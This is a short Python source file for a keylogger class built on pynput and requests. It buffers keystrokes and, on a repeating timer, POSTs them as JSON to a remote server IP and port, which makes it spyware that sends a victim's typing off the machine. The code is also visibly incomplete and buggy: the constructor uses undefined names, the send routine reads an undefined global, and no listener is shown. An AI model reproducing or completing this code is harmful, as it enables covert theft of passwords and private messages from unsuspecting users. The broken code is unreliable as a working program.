from pynput import keyboard

import requests

import json

import threading

class KeyLogger:

    def __init__(self):
        # global variable text where keystrokes are saved as a string which is sent to server
        self.server_ip = server_ip  
        self.port = port
        self.interval = interval
        self.text = ""
    
    def _send_post_request(self):
        payload = json.dumps({"keyboardData": text})
        try:
            requests.post(f"http://{self.server_ip}:{self.port}", 
                          data=payload, 
                          headers={"Content-Type" : "application/json"}
                          )
        except:
            print("Failed to send log!")

        finally:
            self.text = ""
            timer = threading.Timer(self.interval, self._send_post_request)
            timer.start()

